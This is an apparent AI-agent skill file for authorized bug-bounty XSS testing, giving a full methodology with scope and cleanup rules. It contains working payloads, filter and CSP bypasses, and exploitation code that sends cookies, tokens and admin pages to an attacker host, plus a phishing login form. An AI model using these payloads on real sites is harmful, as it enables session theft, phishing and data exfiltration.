---
name: xss
description: Cross-Site Scripting (Reflected / Stored / DOM / Blind). Use when HauntMode flags category #04 as APPLIES/MAYBE, when the user explicitly says they are testing for XSS, or when a request contains user input that is reflected into HTML/JS/attributes/headers and you need an end-to-end testing methodology with payloads, filter bypasses, CSP analysis, and post-exploitation chains.
---

# XSS — Cross-Site Scripting (INDEX #04)

This skill covers detection, confirmation, exploitation, and post-XSS pivoting for all XSS variants (Reflected, Stored, DOM, Blind, WebSocket-delivered, and API-context). Read it top to bottom on first invocation; later runs can jump to the relevant section.

---

## 1. Triggers — when this skill applies

Pulled from INDEX.md "Applies when" plus signals from CBBH/CWEE notes:

- Any user input reflected in an HTML response — search boxes, comment fields, profile fields, error messages, "Hello {name}" responses
- URL parameters or fragment (`#`) values rendered client-side
- Form fields persisted server-side and re-rendered (stored)
- `innerHTML` / `outerHTML` / `document.write` / jQuery `html()` / `add()` / `after()` / `append()` / `prepend()` / `insertAfter()` / `before()` / `replaceAll()` / `replaceWith()` patterns in JS
- Headers reflected into page body — `User-Agent`, `Referer`, `Cookie` values, custom `X-` headers
- Form fields whose values are only visible to **other users** (admin panels, support tickets, contact forms, reviews) → blind XSS candidates
- Filename rendering on download/upload listings
- WebSocket messages echoed into a chat/notification DOM
- API endpoints that reflect parameters back in `text/html` responses

If any of these are present, this skill applies. Err on the side of inclusion.

---

---

## 3. 30-second triage

Drop these in **every** suspect input field. If any reflect into the response and the special characters survive (`<`, `>`, `"`, `'`), the field is reachable for XSS — proceed to confirmation.

```
zzzpoctest"'<>
zzzpoctest"'<svg/onload=1>
```

Then view source / inspect the response:
- Are `<`, `>`, `"`, `'` reflected literally? → likely vulnerable
- Are they HTML-encoded (`&lt;` etc.)? → output encoding present, harder
- Are they stripped entirely? → blacklist filter, try bypasses
- Are they rejected with a 403/blocked page? → WAF in play, rate-limit aware

**Skip deep dive if:**
- Response strips all `<`/`>`/`'`/`"` and the field has length < 6
- Field is server-validated (email regex, UUID format) AND a backend test confirms it cannot be bypassed via Burp tampering

If the response is `Content-Type: application/json` with no HTML wrapper anywhere, jump to the API context section (§9.4).

---

## 4. Pre-flight setup — before any blind/exfil testing

Per `~/bugbounty/CLAUDE.md`:

- **Blind XSS callback:** `YOUR_EZXSS_DOMAIN` (ezXSS). Always append `?param=<fieldname>` to trace which field fired.
- **OOB tracing format:** `<script src="YOUR_EZXSS_DOMAIN/profile_country"></script>`
- **HTTPS exfil server (when ezXSS isn't the right tool):** see `payloads.md` § "HTTPS Exfil Server". Required because modern browsers refuse `http://` resource loads from `https://` pages.
- **Local listener (HTTP only contexts):** `sudo php -S 0.0.0.0:80` or `sudo nc -lvnp 80`
- **Rate limits:** re-read `program-guidelines.txt` — XSS testing is high-volume, easy to trip rate limits.

---

## 5. Detection — minimal payload set per type

### 5.1 Stored (persistent)

Inject in any field that gets saved and rendered later. Re-visit the page (and any sibling pages — admin views, public profile, share links, exports) to see where the payload renders.

```
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src=x onerror=alert(window.origin)>
"><img src=x onerror=alert(1)>
```

`window.origin` (instead of `1`) confirms the execution context — proves it isn't a cross-domain iframe sandbox.

### 5.2 Reflected (non-persistent)

Same payloads as stored, but delivery is via the URL/POST body in the same request. The deliverable is a malicious link.

For GET-based reflection, the URL is the deliverable. Confirm by viewing source, not just watching for an alert (CSP may block the alert but the payload is still injected into source).

### 5.3 DOM-based

Look for `#` (fragment) parameters and JS that reads `document.URL`, `location.hash`, `location.search`, `document.referrer`, `window.name`, `localStorage`, `sessionStorage`, `postMessage` data.

`<script>` may be blocked when injected via `innerHTML` (HTML5 spec — script tags inserted via innerHTML do not execute), so DOM XSS detection prefers event handlers:

```
<img src="" onerror=alert(window.origin)>
<svg onload=alert(window.origin)>
```

Test by appending the payload to the URL fragment: `https://target/#task=<img src=x onerror=alert(1)>`

**Source/Sink mental model:** find the source (where input enters JS) and the sink (where it's written to DOM). Common sinks:
- `document.write()`, `document.writeln()`
- `element.innerHTML`, `element.outerHTML`
- jQuery `html()`, `parseHTML()`, `add()`, `after()`, `append()`, `prepend()`, `before()`, `insertAfter()`, `insertBefore()`, `replaceAll()`, `replaceWith()`
- `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`

### 5.4 Blind

Use when the input is rendered in a context you can't observe (admin panel, support ticket, exported PDF, email, log viewer). Inject the ezXSS callback in **every** field with the field name in the URL so you can identify which fired:

```
<script src="YOUR_EZXSS_DOMAIN/full_name"></script>
<script src="YOUR_EZXSS_DOMAIN/username"></script>
"><script src="YOUR_EZXSS_DOMAIN/country"></script>
'><script src="YOUR_EZXSS_DOMAIN/bio"></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'YOUR_EZXSS_DOMAIN/href\';document.body.appendChild(a)')
```

Also try injecting into:
- HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For` — often logged and rendered in admin dashboards
- File names of uploaded files
- Email subject and body if the app sends emails to admins

**Skip the email and password fields** in registration forms — email is usually format-validated, passwords are hashed (not rendered as text).

If a callback fires hours later → admin opened the panel. Note timing for the report.

---

## 6. Confirmation — proving execution (not just reflection)

Reflection ≠ execution. After detection, confirm execution:

1. **`window.origin` alert** confirms the execution context matches the target domain (not a sandboxed iframe)
2. **`document.domain`** also works as a confirmation token
3. **DOM inspection (`Ctrl+Shift+C`)** to see the rendered HTML, since the page source view may not show DOM-mutated content
4. **Network tab** — confirm whether the request hits the back-end (reflected/stored) or stays client-side (DOM)
5. **For blind:** wait for the ezXSS callback. Don't claim blind XSS without a callback.

If the alert is suppressed by a CSP, confirm via a non-alert sink:
```html
<script>document.title = 'XSS_PROOF_zzzpoc'</script>
<svg onload="document.title='XSS_PROOF_zzzpoc'">
```
Then check the page title via the response or via JS.

---

## 7. Exploitation — goal-oriented payloads

For full payload library see `payloads.md`. Top-line goals below.

### 7.1 Cookie theft (when HttpOnly is missing)

```html
<script src="https://attacker.tld/script.js"></script>
```
Where `script.js`:
```js
new Image().src='https://attacker.tld/log.php?c='+document.cookie;
```

HTTPS-aware variant (preferred — works from HTTPS pages):
```html
<script>fetch(`https://attacker.tld/log?cookie=${btoa(document.cookie)}`)</script>
```

Stealthier (no navigation):
```html
<h1 onmouseover='document.write(`<img src="https://attacker.tld/?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Animation-trigger variant (no user interaction needed):
```html
<style>@keyframes x{}</style>
<video style="animation-name:x" onanimationend="window.location='https://attacker.tld/log?c='+document.cookie"></video>
```

### 7.2 HttpOnly cookie set — pivot to in-session actions

Cookie is unreadable but XSS still has full session authority. Use XHR/fetch to perform any action the victim can perform:

```js
// Read CSRF token from a page, then submit an authenticated state-changing request
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrf = encodeURIComponent(doc.getElementById('csrf_token').value);

var post = new XMLHttpRequest();
post.open('POST', '/home.php', false);
post.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
post.withCredentials = true;
post.send(`username=admin&email=admin@x.tld&password=pwned&csrf_token=${csrf}`);
```

### 7.3 Phishing — fake login form on the trusted page

Inject a login form whose action points to your server, then remove the original UI to make the form look mandatory:

```js
document.write('<h3>Please login to continue</h3><form action=https://attacker.tld><input name="username" placeholder="Username"><input type=password name="password" placeholder="Password"><input type=submit value="Login"></form>');
document.getElementById('urlform').remove();
```
Append `<!--` to the payload to comment out trailing original HTML.

Capture-and-redirect PHP receiver to avoid suspicion (saves creds, redirects victim back to the real page) — see `payloads.md` § "Phishing Receiver".

### 7.4 Account takeover (when password change doesn't require old password)

If the profile-update endpoint accepts a new password without re-auth, ATO is one XHR call. See § 7.2 pattern. Validate by attempting to login as the victim afterwards.

### 7.5 Data exfiltration from privileged endpoints

If the victim is admin and you aren't, exfiltrate every page they can see:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.X.X:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

Iterate by changing the path. Discover endpoints from the response of `/home.php` then pivot. The exploit page can be re-served from your exploit server without needing the victim to re-trigger — they re-fetch `/exploit` on every page load.

### 7.6 Pivot to internal apps via victim's network

XSS payloads run in the victim's browser, so they reach internal-only services the victim can hit. See `Exploiting internal Web Applications I/II.md`. Pattern:

1. Exfiltrate `/admin.php` to find references to `https://internal.X.htb`
2. Probe internal app via XHR from the XSS payload
3. **Watch for CORS errors** — match the exact CORS configuration the legitimate page uses (often `withCredentials = false`). Wrap probes in `try/catch` and exfil the caught error to debug.
4. Once interactive, you can chain SQLi, CMDi, IDOR, etc. against the internal app — invoke the matching skill for those (`sqli`, `cmdi`, `idor`).

### 7.7 Internal API enumeration

Same pattern as 7.6 but bruteforce endpoints from a wordlist (e.g. `seclists/Discovery/Web-Content/api/objects-lowercase.txt`) embedded in the payload. Filter by status code != 404 and exfil hits.

### 7.8 LocalStorage / sessionStorage / bearer tokens

When the app uses bearer auth instead of cookies:
```js
var token = localStorage.getItem('auth_token');
fetch(`https://attacker.tld/log?t=${encodeURIComponent(token)}`);
```

For internal API calls that need the bearer:
```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal.tld/endpoint', false);
xhr.setRequestHeader('Authorization', 'Bearer ' + localStorage.getItem('auth_token'));
xhr.send();
```

### 7.9 Self-XSS escalation

A self-XSS alone is not a finding. But it's escalatable if:
- It can be triggered by a CSRF — see chain candidates below
- It renders in a way that affects other users (admin viewing your profile, support reading your ticket)
- The injected page is iframable and clickjacking can force the victim to trigger it

Don't dismiss self-XSS without checking these.

---

## 8. Filter bypass — when basic payloads fail

Brief inline catalogue. Full set in `payloads.md`.

### 8.1 Achieving JS execution beyond `<script>`

- **Pseudo-protocols:** `<a href="javascript:alert(1)">`, `<object data="javascript:alert(1)">`, `<object data="data:text/html,<script>alert(1)</script>">`, `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`
- **Event handlers:** `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `<body onload=alert(1)>`, `<input onfocus=alert(1) autofocus>`, `<details ontoggle=alert(1) open>`
- Full event handler list: PortSwigger XSS Cheat Sheet (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### 8.2 Casing bypass (against case-sensitive blacklists)

```html
<ScRiPt>alert(1)</ScRiPt>
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
```

### 8.3 Recursive/nested filter bypass (when filter strips once, not recursively)

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### 8.4 Whitespace/structural bypass

```html
<svg/onload=alert(1)>
<script/src="YOUR_EZXSS_DOMAIN/x"></script>
<img/src/onerror=alert(1)>
```

### 8.5 Encoding tricks for blocked strings

For the string `alert(1)`:
- Unicode: `"alert(1)"`
- Octal: `"\141\154\145\162\164\50\61\51"`
- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
- Base64: `atob("YWxlcnQoMSk=")`

When quotes are blocked (string creation):
- `String.fromCharCode(97,108,101,114,116,40,49,41)`
- `/alert(1)/.source`
- `decodeURI(/alert(%22xss%22)/.source)`

### 8.6 Execution sinks (string → execution)

```js
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor("alert(1)")()
```

Combined: `Function(atob("YWxlcnQoMSk="))()`

### 8.7 URL-encoding bypass when the app naively decodes once

If the WAF sees the request post-decode but the app double-decodes:
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

If the API is encoding output before reflection, try URL-encoded payload as input — sometimes the encoded version is what gets reflected un-encoded:
```
%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

### 8.8 No-parens variants

Reference: https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
Common: `<svg onload=alert\`1\`>` (template literal as call)

### 8.9 Browser-specific quirks

`html5sec.org` for browser-specific edge cases (mostly IE/old Edge but a few modern Chromium/Firefox idioms remain).

---

## 9. Context-specific notes

### 9.1 Injection in `<script>` block (JS context)

If your input lands inside an existing `<script>` tag value, you don't need new `<script>` tags. Break out of the string literal:
- If reflected inside `var x = "INPUT"`: payload `";alert(1);//`
- If reflected inside `var x = 'INPUT'`: payload `';alert(1);//`
- If reflected inside `var x = `INPUT``: payload `${alert(1)}`

### 9.2 Injection in HTML attribute

Break out of the attribute first:
- `" autofocus onfocus=alert(1) x="`
- `' onmouseover='alert(1)`

If `<` `>` are blocked but you're inside an attribute, you may not need them at all.

### 9.3 Injection in URL/href context

Pseudo-protocol works even without breakouts:
- `javascript:alert(1)`
- `data:text/html,<script>alert(1)</script>`

### 9.4 API context (JSON responses)

If the response is `Content-Type: application/json` and your input is reflected as a JSON string, browsers won't render it as HTML — XSS is normally not reachable. But it IS reachable if:
- A different endpoint renders that JSON-stored value into HTML later (stored XSS via API)
- The API endpoint can be made to return `text/html` by tweaking `Accept` header or the request method (GET vs POST)
- The API URL itself is loaded directly in the browser (not via fetch) — try URL-encoding payloads. See the CBBH Web Service notes example: payload as `%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E` worked when single-encoded JSON params were rendered.

### 9.5 WebSocket-delivered XSS

If the app pipes WS messages through `innerHTML` without sanitization, every WS message becomes an XSS vector. Note: `<script>` inserted via `innerHTML` does NOT execute — use event handlers (`<img src=x onerror=alert(1)>`).

Look in client JS for: `socket.addEventListener('message', ...)` followed by an `innerHTML +=` chain.

### 9.6 SVG / image upload context

`.svg` files can carry XSS. If the file upload allows SVG:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>alert(document.domain)</script>
</svg>
```
The XSS fires when the SVG is rendered in-browser (not just downloaded).

### 9.7 PDF generation context

If the app generates PDFs from HTML user input via Puppeteer/wkhtmltopdf, server-side JS may execute → SSRF or LFI rather than client XSS. Cross-link to the `pdf-injection` skill.

---

## 10. CSP analysis

If the response includes `Content-Security-Policy`, basic payloads may fail even when the injection point is fully open. **Don't conclude "not vulnerable" — analyze the CSP**.

See `csp-bypass.md` for the full methodology. Quick check:

1. Capture the CSP header verbatim
2. Identify allowed sources in `script-src`, `default-src`, `connect-src`
3. Check for common weaknesses:
   - `'unsafe-inline'` → inline scripts work; basic payloads fly
   - `'unsafe-eval'` → eval-based payloads work
   - Allowlisted JSONP-capable hosts (Google domains, common CDNs) → use JSONBee endpoints
   - `'self'` plus a file-upload functionality → upload `.js` and load it as same-origin
   - Wildcard subdomains of a common CDN → host attack JS there if you can
   - Missing `object-src` → `<object data=...>` may bypass
4. Run the CSP through `csp-evaluator.withgoogle.com` for a second opinion

---

## 11. False-positive checks

Don't report any of the following as XSS without escalation:

- **Reflection without execution** — input is reflected but properly HTML-encoded. View source (Ctrl+U), look for `&lt;`/`&gt;`/`&quot;`. Encoded → not exploitable as-is.
- **Sandboxed iframe** — payload fires but `window.origin` shows a different / null origin. Limited or no impact unless the parent can be reached.
- **Self-XSS only** — payload only fires for the user injecting it, no CSRF trigger possible, no admin renders the field. Often graded as informational unless you can chain.
- **`alert()` blocked by browser, but no other sink works either** — if `print()`, `confirm()`, `prompt()`, `document.title=` all also fail, the execution genuinely isn't happening; modern browsers don't selectively block `alert()` in normal contexts.
- **CSP fully blocks execution and you can't bypass** — note the CSP, write up the injection-point disclosure as informational, but don't claim XSS.
- **Injection only in HTTP response headers via CRLF** — that's CRLF/response splitting, not XSS. Cross to `crlf` skill.

---

## 12. Chain candidates

If XSS confirmed, these are the highest-impact chains. Load the matched skill if pursuing.

| Chain | Other skill | Impact uplift |
|---|---|---|
| Stored XSS in admin-rendered field → cookie steal / in-session admin action | `csrf` (for state change), `idor` / `auth-bypass` (for what to attack as admin) | Site takeover |
| XSS bypassing same-origin CSRF protection | `csrf` | Bypasses SameSite=Lax + Origin/Referer checks |
| XSS in profile field that admin moderates | `idor` (admin-only endpoints) | Privilege escalation |
| XSS reaching internal-only API/webapp | `ssrf` (similar mindset), `sqli`, `cmdi` (depending on internal vuln) | RCE / data dump |
| XSS via SVG upload | `file-upload` | Combined upload + XSS finding |
| XSS via WebSocket frame | `websocket` | Confirms WS-delivered DOM injection |
| XSS via file name | `file-upload` | Stored XSS in file index |
| XSS via PDF generator (server-side) | `pdf-injection`, `ssrf` | Server-side rendering pivot |
| Self-XSS + CSRF trigger | `csrf` | Promotes self-XSS to attacker-triggerable |
| XSS reflected in error message → blind ATO via cache poison | `cache-poisoning` | Mass account targeting |
| XSS in API endpoint with JSON body | `api-attacks` | Confirms API attack surface |

---

## 13. Reporting template

Pre-filled per the HauntMode reporting block from CLAUDE.md. Fill the angle-bracketed fields.

```
🔴 POTENTIAL FINDING: Cross-Site Scripting — <Stored | Reflected | DOM | Blind>
Target: <full URL of injection point>
Parameter: <param name + location: query/body/header/cookie/path/fragment>
Reflection context: <HTML body | HTML attribute | JS string | URL/href | JSON | etc.>
Filtering observed: <none | partial blacklist of X | output encoding | CSP present>
Working payload:
    <exact payload that fired>
Evidence:
    <screenshot reference, response excerpt showing payload in source, alert/origin observation, ezXSS callback timestamp>
Execution context: <window.origin = X.tld | sandboxed iframe origin Y | DOM only>
Cookie protection: <HttpOnly = on | off>  Secure = <on | off>  SameSite = <strict|lax|none|unset>
Impact:
    <chosen impact statement, e.g. "Account takeover via session cookie theft" or
     "Admin in-session action execution despite HttpOnly via fetch+CSRF-token-extract" or
     "Internal-only API <X> enumerated through admin victim's browser">
Chain potential: <list other skills/findings combined>
Next step: <e.g. "Develop ATO PoC against test admin", "Confirm CSP bypass via JSONBee Google endpoint",
            "Submit ezXSS payload to support form and wait for callback", "Verify in scope per program-guidelines.txt">
```

---

## 14. Recon tracker vector strings

**Only log if the user explicitly authorizes** (see CLAUDE.md "CRITICAL RULE"). Suggested vector tags when authorized:

- `xss:reflected:<param>` — confirmed reflected XSS in named param
- `xss:stored:<field>` — confirmed stored XSS in named field
- `xss:dom:<sink>` — confirmed DOM XSS via named sink
- `xss:blind-callback:<field>` — ezXSS callback received from named field
- `xss:csp:<directive>` — CSP analysis result
- `xss:filter-bypass:<technique>` — when a non-trivial bypass was needed
- `xss:no:<param>` — confirmed not vulnerable (encoded / filtered) — useful to avoid re-testing
- `xss:chain:<other-vuln>` — XSS used to reach another vuln class

Status transitions: `untested` → `in-progress` → `interesting` (on first reflection) → `finding` (on confirmed execution) or `dead-end` (encoded everywhere).

---

## 15. What NOT to do

- **Do not submit destructive payloads on production** — no `document.body.innerHTML=''`, no infinite alert/`location.reload()` loops, no drive-by malicious downloads. Stick to PoC-only payloads (`alert(window.origin)`, harmless cookie exfil to your own listener).
- **Do not test on out-of-scope domains.** Re-read `scope.txt` before sending payloads.
- **Do not exhaust rate limits with large payload lists.** Use a focused 5–10 payload set first; only escalate to xsstrike-class fuzzing if the user authorizes.
- **Do not exfiltrate real user data** beyond what's necessary to prove the vuln. If you can prove ATO with one cookie exfil, stop there. Don't dump the admin DB.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not leave injected payloads in stored fields** — clean up after yourself when testing on shared accounts. Note original values before overwriting.
- **Do not chain into out-of-scope third parties.** If XSS reaches an OAuth provider or a third-party API, flag it but don't probe the third party.
- **Do not use `Burp Active Scanner` (Pro) — we are on Community.** Use ezXSS for OOB and manual payloads via Repeater.
